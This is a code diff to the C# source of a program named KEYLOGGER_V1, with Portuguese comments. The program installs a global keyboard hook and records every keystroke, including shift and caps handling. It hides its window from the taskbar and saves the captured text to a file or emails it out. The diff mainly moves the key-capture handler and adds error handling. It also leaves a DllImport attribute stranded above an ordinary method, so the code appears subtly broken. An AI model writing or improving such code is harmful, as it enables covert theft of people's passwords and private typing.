@@ -83,22 +83,15 @@ namespace KEYLOGGER_V1
              email.SalvaLogOuEnviaEmail(txtTextoDigitadoLimpo.Text,@"C:\Key\Keylogger.txt");
              txtTextoDigitadoLimpo.Clear();
         }
-        void gkh_KeyDown(object sender, KeyEventArgs e)                        //EVENTO: do HOOK para scaneamento das teclas
-        {
-            // TEXTO com todos as Teclas nomeadas.
-            txtTextoDigitado.Text += Monitoramento_Geral_Teclas(Convert.ToString(e.KeyCode)); 
-            // TEXTO com as teclas editadas.
-            txtTextoDigitadoLimpo.Text += Monitoramento_Maisculas_Minusculas(Monitoramento_Geral_Teclas(Convert.ToString(e.KeyCode)));
-        }
+     
 
 
 
 
-//------------------------------------------------------------------[METODOS]--------------------------------------------------------------------------------------        
-
+//------------------------------------------------------------------[METODOS]---------------------------------------------------------------------------------------        
 
         bool _ShiftPressionado = false;
-        String Monitoramento_Geral_Teclas(String Key)                       //METODO: Mapeamento de teclas, e Comparação das teclas para substituição, Evento de ações.
+        String Monitoramento_Geral_Teclas(String Key)                          //METODO: Mapeamento de teclas, e Comparação das teclas para substituição, Evento de ações.
         {
 
             switch (Key)
@@ -136,8 +129,13 @@ namespace KEYLOGGER_V1
                 case "Escape":
                     return "[Esc]";
                 case "Back":
-                    txtTextoDigitadoLimpo.Text = txtTextoDigitadoLimpo.Text.Substring(0, txtTextoDigitadoLimpo.Text.Length - 1); //Apaga o ultimo caracter digitado na linha.
-                    return "[Back]";
+                    try
+                    {
+                        txtTextoDigitadoLimpo.Text = txtTextoDigitadoLimpo.Text.Substring(0, txtTextoDigitadoLimpo.Text.Length - 1);
+                        //Apaga o ultimo caracter digitado na linha.
+                        return "[Back]";
+                    }
+                    catch (Exception) { return ""; }          
                 case "PrintScreen":
                     return "[Print Screen]";
                 case "Pause":
@@ -235,7 +233,7 @@ namespace KEYLOGGER_V1
 
 
         }
-        public string Monitoramento_Maisculas_Minusculas(string tecla)      //METODO: Monitora digitação de letras com o Capslook ou Shift Ativo.
+        public string Monitoramento_Maisculas_Minusculas(string tecla)         //METODO: Monitora digitação de letras com o Capslook ou Shift Ativo.
         {
             string segundoCaracter = null;
 
@@ -288,7 +286,7 @@ namespace KEYLOGGER_V1
 
 
         }
-        void Hide(bool key)                                                 //METODO: torna o formulário invisivel 
+        void Hide(bool key)                                                    //METODO: torna o formulário invisivel 
         {
             if (key)
             {
@@ -302,7 +300,7 @@ namespace KEYLOGGER_V1
                 this.ShowInTaskbar = true;
             }
         }
-        String TeclaAtalhos(String texto, String caracter)                  //METODO:  verifica a sequência de Tecla digitada.
+        String TeclaAtalhos(String texto, String caracter)                     //METODO:  verifica a sequência de Tecla digitada.
         {
 
             int contCarac = caracter.Length;
@@ -323,15 +321,25 @@ namespace KEYLOGGER_V1
         }
 
 
+
+
+//------------------------------------------------------------------[REFERENTE A CLASSE HOOK]-----------------------------------------------------------------------
+
+
         //INSTÂNCIA DA CLASSE: que retorna o valor das teclas digitada em cada KEYDOWN
         globalKeyboardHook gkh = new globalKeyboardHook();
-        
+
         //Utilizado para a Confirmação da conexão. 
         [DllImport("wininet.dll")]
 
-        //Utilizado para a Confirmação da conexão.
-        private extern static Boolean InternetGetConnectedState(out int Description, int ReservedValue);
 
+        void gkh_KeyDown(object sender, KeyEventArgs e)           //EVENTO: do HOOK para scaneamento das teclas
+        {
+            // TEXTO com todos as Teclas nomeadas.
+            txtTextoDigitado.Text += Monitoramento_Geral_Teclas(Convert.ToString(e.KeyCode));
+            // TEXTO com as teclas editadas.
+            txtTextoDigitadoLimpo.Text += Monitoramento_Maisculas_Minusculas(Monitoramento_Geral_Teclas(Convert.ToString(e.KeyCode)));
+        }
         private void HookAll()                                    //METODO: pega o enumerador da tecla e substitui por uma sequencia de caracteres
         {
             foreach (object key in Enum.GetValues(typeof(Keys)))
